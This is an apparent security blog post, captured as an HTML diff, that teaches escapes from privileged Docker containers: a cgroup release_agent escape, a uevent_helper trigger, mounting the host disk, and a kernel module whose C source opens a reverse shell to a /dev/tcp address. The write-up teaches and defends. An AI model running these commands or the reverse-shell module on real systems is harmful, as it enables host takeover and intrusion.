@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+        
+<meta charset="utf-8">
+<meta name="HandheldFriendly" content="True">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer-when-downgrade">
+
+<title>Container Breakouts – Part 2: Privileged Container  - Nody´s blog</title>
+<meta name="description" content="Blog with infosec content from Jan Harrie">
+
+<link rel="alternate" type="application/rss+xml" title="RSS" href="http://nodyhub.github.io/rss/">
+
+<link rel="icon" type="image/x-icon" href="http://nodyhub.github.io/favicon.ico">
+<link rel="apple-touch-icon-precomposed" href="http://nodyhub.github.io/favicon.png">
+
+<link rel="stylesheet" href="http://nodyhub.github.io/css/style.css?rnd=1609148254" />
+
+<meta property="og:title" content="Container Breakouts – Part 2: Privileged Container" />
+<meta property="og:description" content="This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://nodyhub.github.io/posts/container-breakouts-part2/" />
+<meta property="og:image" content="http://nodyhub.github.io/images/logo.png"/>
+<meta property="article:published_time" content="2020-07-21T15:42:19+02:00" />
+<meta property="article:modified_time" content="2020-07-21T15:42:19+02:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://nodyhub.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="Container Breakouts – Part 2: Privileged Container"/>
+<meta name="twitter:description" content="This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged."/>
+
+
+
+
+
+
+    
+</head>
+<body>
+    <div class="container">
+        <header> 
+            
+                <h1 class="site-header">
+    <a href="http://nodyhub.github.io/">Nody´s blog</a>
+</h1>
+<nav>
+    
+    
+    <a class="" href="/about/" title="About">About</a>
+    
+    <a class="" href="/tags/" title="Tags">Tags</a>
+    
+    <a class="" href="/posts/" title="Archive">Archive</a>
+    
+</nav>
+
+            
+        </header>
+        <main>
+            
+
+    <article class="post">
+        <header>
+            <h1>Container Breakouts – Part 2: Privileged Container</h1>
+        </header>
+        <div class="content">
+            <p>This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged.</p>
+<p>The following posts are part of the series:</p>
+<ul>
+<li><a href="../container-breakouts-part1">Part 1: Access to root directory of the Host</a></li>
+<li>Part 2: Privileged Container</li>
+<li><a href="../container-breakouts-part3">Part 3: Docker Socket</a></li>
+</ul>
+<h2 id="intro">Intro</h2>
+<p>This is the second post of my container breakout series. After the discussion on how to escape from a system with access only to the root directory, we will now dive into the privileged container. The escalation itself is this time a bit more OpSec-safe then the previous, but still a bit noisy. The proposed techniques are now more container related, then the previous post.</p>
+<h2 id="privileged-container">Privileged Container</h2>
+<p>If you start a container with Docker and you add the flag <code>--privileged</code> that means to the process in the container can act as root user on the host. The containerization would have the advantage of self-containing software deployment, but <strong>no</strong> real <strong>security boundaries to</strong> the <strong>kernel</strong> when started with that flag.</p>
+<p>There are multiple ways to escape from a privileged container. Let us have a look&hellip;</p>
+<h3 id="capabilities">Capabilities</h3>
+<p>We will now explore two techniques that can be used to break out of the container. It is important to note here that it is only possible to abuse the <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities</a>, because there is no <a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">seccop</a> filter in place. This is the case if a container is started with <code>--privileged</code>. Docker containers are normally started with a seccomp filter enabled and give an additional layer of security.</p>
+<p>The available capabilities inside the container can be printed with the command <code>capsh --print</code>. The details about each capability can be taken from the man page (<code>man capavilities</code>). In case of a privileged container, all capabilities are available. An example output looks like following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~# capsh --print
+Current: <span style="color:#f92672">=</span> cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
+Bounding set <span style="color:#f92672">=</span>cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+Securebits: 00/0x0/1<span style="color:#960050;background-color:#1e0010">&#39;</span>b0
+ secure-noroot: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>
+ secure-no-suid-fixup: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>
+ secure-keep-caps: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</code></pre></div><p>An alternative location to get details about the process capabilities can be taken from <code>/proc/self/status</code>, as following (thanks to <a href="https://twitter.com/brompwnie">Chris le Roy</a> for one of the latest tweets):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">user@ca719daf3844:~$ grep Cap /proc/self/status
+CapInh:	0000003fffffffff
+CapPrm:	<span style="color:#ae81ff">0000000000000000</span>
+CapEff:	<span style="color:#ae81ff">0000000000000000</span>
+CapBnd:	0000003fffffffff
+CapAmb:	<span style="color:#ae81ff">0000000000000000</span>
+
+user@ca719daf3844:~$ capsh --decode<span style="color:#f92672">=</span>0000003fffffffff
+0x0000003fffffffff<span style="color:#f92672">=</span>cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+</code></pre></div><p>A detailed summary of sensitive kernel capabilities can be taken from the forum <a href="https://grsecurity.net/">grsecurity</a> post from spender <a href="https://forums.grsecurity.net/viewtopic.php?t=2522">False Boundaries and Arbitrary Code Execution</a>.</p>
+<h4 id="cap_sys_admin--cgroup-notify-on-release-escape"><code>CAP_SYS_ADMIN</code> – cgroup notify on release escape</h4>
+<p>One of the dangerous kernel capabilities is <code>CAP_SYS_ADMIN</code>. If you are acting in a container with this capability, you can manage cgroups of the system. As a short re-cap – <a href="https://man7.org/linux/man-pages/man7/cgroups.7.html">cgroups</a> are used to manage the system resources for a container (that’s very brief – I know).</p>
+<p>In this escape, we use a <strong>feature of cgroups</strong> that allows the <strong>execution</strong> of code <strong>in</strong> the <strong>root context</strong>, after the last process in a cgroup is terminated. The feature is called <strong>“notification on release”</strong> and can only be set, because we have the capability <code>CAP_SYS_ADMIN</code>.</p>
+<p>This technique got popular after <a href="https://twitter.com/_fel1x">Felix Wilhelm</a> from <a href="https://googleprojectzero.blogspot.com/">Google Project Zero</a> put the escape in one tweet. <a href="https://www.trailofbits.com/">Trail of Bits</a> has even investigated further this topic and all details can be read in their blogpost <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">Understanding Docker container escapes</a>.</p>
+<p>Here is just the quintessence of this approach:</p>
+<ol>
+<li>Create a new cgroup</li>
+<li>Create and activate “callback” with <code>notify_on_release</code></li>
+<li>Create an ephemeral process in new cgroup to trigger “callback”</li>
+</ol>
+<p>The following commands are necessary to perform the attack:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~# mkdir /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mount -t cgroup -o rdma cgroup /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mkdir /tmp/cgrp/escape_cgroup
+
+~# echo <span style="color:#ae81ff">1</span> &gt; /tmp/cgrp/escape_cgroup/notify_on_release
+~# host_path<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>sed -n <span style="color:#e6db74">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style="color:#e6db74">`</span>
+~# echo <span style="color:#e6db74">&#34;</span>$host_path<span style="color:#e6db74">/cmd&#34;</span> &gt; /tmp/cgrp/release_agent
+
+~# echo <span style="color:#e6db74">&#39;#!/bin/sh&#39;</span> &gt; /cmd
+~# echo <span style="color:#e6db74">&#34;ps aux | /sbin/tee </span>$host_path<span style="color:#e6db74">/cmdout&#34;</span> &gt;&gt; /cmd
+~# chmod a+x /cmd
+
+~# sh -c <span style="color:#e6db74">&#34;echo 0 &gt; /tmp/cgrp/escape_cgroup/cgroup.procs&#34;</span> 
+~# sleep <span style="color:#ae81ff">1</span>
+~# head /cmdout
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           <span style="color:#ae81ff">1</span>  0.0  0.1 <span style="color:#ae81ff">108272</span> <span style="color:#ae81ff">11216</span> ?        Ss   20:57   0:00 /sbin/init
+root           <span style="color:#ae81ff">2</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    20:57   0:00 <span style="color:#f92672">[</span>kthreadd<span style="color:#f92672">]</span>
+root           <span style="color:#ae81ff">3</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   20:57   0:00 <span style="color:#f92672">[</span>rcu_gp<span style="color:#f92672">]</span>
+root           <span style="color:#ae81ff">4</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   20:57   0:00 <span style="color:#f92672">[</span>rcu_par_gp<span style="color:#f92672">]</span>
+root           <span style="color:#ae81ff">6</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   20:57   0:00 <span style="color:#f92672">[</span>kworker/0:0H-kblockd<span style="color:#f92672">]</span>
+root           <span style="color:#ae81ff">7</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    20:57   0:00 <span style="color:#f92672">[</span>kworker/u8:0-events_power_efficient<span style="color:#f92672">]</span>
+root           <span style="color:#ae81ff">8</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   20:57   0:00 <span style="color:#f92672">[</span>mm_percpu_wq<span style="color:#f92672">]</span>
+root           <span style="color:#ae81ff">9</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    20:57   0:00 <span style="color:#f92672">[</span>ksoftirqd/0<span style="color:#f92672">]</span>
+root          <span style="color:#ae81ff">10</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    20:57   0:00 <span style="color:#f92672">[</span>rcuc/0<span style="color:#f92672">]</span>
+</code></pre></div><p>To by honest, this <strong>technique</strong> was in my setup <strong>a bit flaky</strong> and I had some issues while repeating it. Do not worry if it is not working on the first try.</p>
+<h4 id="cap_sys_module--load-kernel-module"><code>CAP_SYS_Module</code> – Load Kernel Module</h4>
+<p>What do you need to <strong>load a kernel module on a Unix host</strong>? Exact, the right capability: <code>CAP_SYS_MODULE</code>. In advance, you <strong>must</strong> be in the <strong>same process namespace as</strong> the <strong>init</strong> process, but <strong>that is default</strong> in case of plain Docker setups. You think now <em>how dare you</em> this is something nobody would do!? That is exactly what happened to <em>Play-with-Docker</em>. I recommend reading the post <a href="https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host">How I Hacked Play-with-Docker and Remotely Ran Code on the Host</a> by <a href="https://twitter.com/n1mr0d5">Nimrod Stoler</a> to get all insights and the full picture.</p>
+<p>The exploitation cannot be that easily weaponized, because we need a <strong>kernel module</strong> that <strong>fits</strong> the <strong>kernel version</strong>. To do so, we need to <strong>compile</strong> our own <strong>kernel module</strong> for the host system kerne. I thought initially that’s an easy one, just <em>copy&amp;paste</em> the code, compile and finished. Sounds easy? It is not that easy if you have an Ubuntu container on an Archlinux host – sigh.</p>
+<p>To perform the steps I had to cheat a bit. Previously, we have performed all steps from inside the container. This time, I will <strong>pre-compile</strong> the <strong>kernel module outside</strong> of the <strong>container</strong>. Why is that necessary in my case? Because I had issues to compile the kernel module for the Archlinux kernel inside an ubuntu container with the Ubuntu toolchain. I am not a kernel developer, so I dropped to dive into the issues and let someone with more expertise to deep-dive on that topic.</p>
+<p>To <strong>prepare</strong> the <strong>kernel module</strong>, you <strong>need</strong> the <strong>kernel headers</strong> for the host that runs the container. You can find them while googling through the internet and search for the kernel version headers (kernel version can be identified by <code>uname -r</code>). Afterward, you need the <em>gcc</em> compiler and <em>make</em> and that’s it.</p>
+<p>The following steps have been performed on a separate host (an ubuntu system).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~# apt update <span style="color:#f92672">&amp;&amp;</span> apt install -y gcc make linux-headers 
+
+~# cat <span style="color:#e6db74">&lt;&lt; EOF &gt; reverse-shell.c
+</span><span style="color:#e6db74">#include &lt;linux/kmod.h&gt;
+</span><span style="color:#e6db74">#include &lt;linux/module.h&gt;
+</span><span style="color:#e6db74">MODULE_LICENSE(&#34;GPL&#34;);
+</span><span style="color:#e6db74">MODULE_AUTHOR(&#34;AttackDefense&#34;);
+</span><span style="color:#e6db74">MODULE_DESCRIPTION(&#34;LKM reverse shell module&#34;);
+</span><span style="color:#e6db74">MODULE_VERSION(&#34;1.0&#34;);
+</span><span style="color:#e6db74">char* argv[] = {&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;bash -i &gt;&amp; /dev/tcp/172.17.0.2/1337 0&gt;&amp;1&#34;, NULL};
+</span><span style="color:#e6db74">static char* envp[] = {&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;, NULL };
+</span><span style="color:#e6db74">static int __init reverse_shell_init(void) {
+</span><span style="color:#e6db74">return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+</span><span style="color:#e6db74">}
+</span><span style="color:#e6db74">static void __exit reverse_shell_exit(void) {
+</span><span style="color:#e6db74">printk(KERN_INFO &#34;Exiting\n&#34;);
+</span><span style="color:#e6db74">}
+</span><span style="color:#e6db74">module_init(reverse_shell_init);
+</span><span style="color:#e6db74">module_exit(reverse_shell_exit);
+</span><span style="color:#e6db74">EOF</span>
+
+~# cat Makefile
+obj-m +<span style="color:#f92672">=</span>reverse-shell.o
+all:
+	make -C /lib/modules/<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> modules
+clean:
+	make -C /lib/modules/<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> clean
+
+~# make
+
+</code></pre></div><p>After the <strong>kernel module</strong> is <strong>prepared</strong>, the binary is <strong>transferred to</strong> the privileged <strong>container</strong>. This can be Base64-encoded (in my case 86 lines) or another transfer technique. With the binary transferred into the container, we can start in the <strong>listener</strong> for the <strong>reverse shell</strong>.</p>
+<p><strong>Terminal 1</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~# nc -lvlp <span style="color:#ae81ff">1337</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+</code></pre></div><p>Terminal 1 must be on a system that is accessible from the host, that serves the container. The listener can even be started inside the container.  If the listener is ready, the kernel module can be loaded, and the host will initiate the reverse shell.</p>
+<p><strong>Terminal 2</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~# insmod reverse-shell.ko
+</code></pre></div><p>And that’s it!</p>
+<p><strong>Terminal 1</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~# nc -lvlp <span style="color:#ae81ff">1337</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+
+172.17.0.1: inverse host lookup failed: Unknown host
+connect to <span style="color:#f92672">[</span>172.17.0.2<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>172.17.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">55010</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+root@linux-box:/#
+</code></pre></div><p>A more detailed explanation can be found here <a href="https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd">Docker Container Breakout: Abusing SYS_MODULE capability!</a> by <a href="https://linkedin.com/in/wifisecguy/">Nishant Sharma</a>.</p>
+<h3 id="linux-kernel-filesystem-sys">Linux kernel Filesystem <code>/sys</code></h3>
+<p>The Linux kernel offers access over the filesystem <code>/sys</code> direct access to the kernel. In case you are root – what we are in a privileged container – you can trigger events that got consumed and processed by the kernel. One of the interfaces is the <code>uevent_helper</code> which is a callback that is triggered as soon a new device is plugged in the system. The plugin a new device can be simulated as well by the <code>/sys</code> filesystem.</p>
+<p>An example to execute commands on the host system is as follows:</p>
+<ol>
+<li>Create “callback”</li>
+<li>Link “callback”</li>
+<li>Trigger “callback”</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~# host_path<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>sed -n <span style="color:#e6db74">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style="color:#e6db74">`</span>
+
+~# cat <span style="color:#e6db74">&lt;&lt; EOF &gt; /trigger.sh
+</span><span style="color:#e6db74">#!/bin/sh  
+</span><span style="color:#e6db74">ps auxf &gt; $host_path/output.txt
+</span><span style="color:#e6db74">EOF</span>
+
+~# chmod +x /trigger.sh 
+
+~# echo $host_path/trigger.sh &gt; /sys/kernel/uevent_helper
+
+~# echo change &gt; /sys/class/mem/null/uevent
+
+~# head /output.txt
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         <span style="color:#ae81ff">2</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    14:14   0:00 <span style="color:#f92672">[</span>kthreadd<span style="color:#f92672">]</span>
+root         <span style="color:#ae81ff">3</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>kworker/0:0<span style="color:#f92672">]</span>
+root         <span style="color:#ae81ff">4</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>kworker/0:0H<span style="color:#f92672">]</span>
+root         <span style="color:#ae81ff">5</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>kworker/u4:0<span style="color:#f92672">]</span>
+root         <span style="color:#ae81ff">6</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>mm_percpu_wq<span style="color:#f92672">]</span>
+root         <span style="color:#ae81ff">7</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>ksoftirqd/0<span style="color:#f92672">]</span>
+root         <span style="color:#ae81ff">8</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>rcu_sched<span style="color:#f92672">]</span>
+root         <span style="color:#ae81ff">9</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>rcu_bh<span style="color:#f92672">]</span>
+root        <span style="color:#ae81ff">10</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    14:14   0:00  <span style="color:#ae81ff">\_</span> <span style="color:#f92672">[</span>migration/0<span style="color:#f92672">]</span>
+</code></pre></div><p>As you can see, the script is executed and the output made available inside the container.</p>
+<p><em>Remark: Thanks to <a href="https://twitter.com/uchi_mata">Matthias</a> for the review and remembering me to add this breakout  technique!</em></p>
+<h3 id="host-devices">Host Devices</h3>
+<p>If you are in a privileged container, the devices are not striped and namespaced. A quick directory <strong>listing</strong> of the <strong>devices</strong> in the container shows that we have <strong>access to all</strong> of them. Since we are <code>root</code> and have all capabilities, we can <strong>mount</strong> the <strong>devices</strong> that are plugged into the host – as well as the hard drive.</p>
+<p>Mounting the hard drive is giving us access to the host filesystem.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@0462216e684b:~# ls -l /dev/
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+brw-rw---- <span style="color:#ae81ff">1</span> root  <span style="color:#ae81ff">994</span>   8,   <span style="color:#ae81ff">0</span> Jul <span style="color:#ae81ff">11</span> 09:20 sda
+brw-rw---- <span style="color:#ae81ff">1</span> root  <span style="color:#ae81ff">994</span>   8,   <span style="color:#ae81ff">1</span> Jul <span style="color:#ae81ff">11</span> 09:20 sda1
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+
+~# mkdir /hostfs
+~# mount /dev/sda1 /hostfs
+~# ls -l /hostfs/
+total <span style="color:#ae81ff">132</span>
+lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">7</span> Nov <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2019</span> bin -&gt; usr/bin
+drwxr-xr-x   <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">13</span> 13:29 boot
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+drwxr-xr-x <span style="color:#ae81ff">104</span> root root <span style="color:#ae81ff">12288</span> Jul <span style="color:#ae81ff">11</span> 10:09 etc
+drwxr-xr-x   <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">30</span> 14:47 home
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+drwxr-x---   <span style="color:#ae81ff">9</span> root root  <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">11</span> 10:09 root
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">7</span> Nov <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2019</span> sbin -&gt; usr/bin
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+drwxr-xr-x  <span style="color:#ae81ff">10</span> root root  <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">26</span> 14:37 usr
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</code></pre></div><p>Escalating the access to the root directory of the host is already described in the <strong>previous part</strong> of the series <a href="../container-breakouts-part1">Part 1: Access to root directory of the Host</a>.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>We have seen three approaches that can be used if a Unix container is started with an insecure configuration.</p>
+<p>The main take away message is that one should <strong>be careful if</strong> a <strong>container must</strong> be <strong>started</strong> in <strong>privileged</strong> mode. Ether it is one of the management components that are needed for controlling the container host system or a malicious agenda. <strong>Never start a container privileged if it is not necessary</strong> and review carefully the additional capabilities that a container might require.</p>
+<p>Now you know why we discussed the breakout techniques with access to the root directory, before I discussed the access to the host devices.</p>
+<p>If you are interested in how to use the Docker socket to get out of the container, continue with the next post <a href="../container-breakouts-part3">Part 3: Docker Socket</a>.</p>
+        </div>
+        <div class="article-info">
+    
+        <div class="article-date">2020-07-21</div>
+    
+    <div class="article-taxonomies">
+        
+            
+                <ul class="article-tags">
+                    
+                        <li><a href="http://nodyhub.github.io/tags/docker">#docker</a></li>
+                    
+                        <li><a href="http://nodyhub.github.io/tags/breakout">#breakout</a></li>
+                    
+                        <li><a href="http://nodyhub.github.io/tags/security">#security</a></li>
+                    
+                </ul>
+        
+    </div>
+</div>
+
+    </article>
+    
+
+
+        </main>
+        <footer>
+            
+                <p>© Jan Harrie, 2020<br>
+Powered by <a target="_blank" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.
+</p>
+            
+        </footer>
+    </div>
+</body>
+</html>
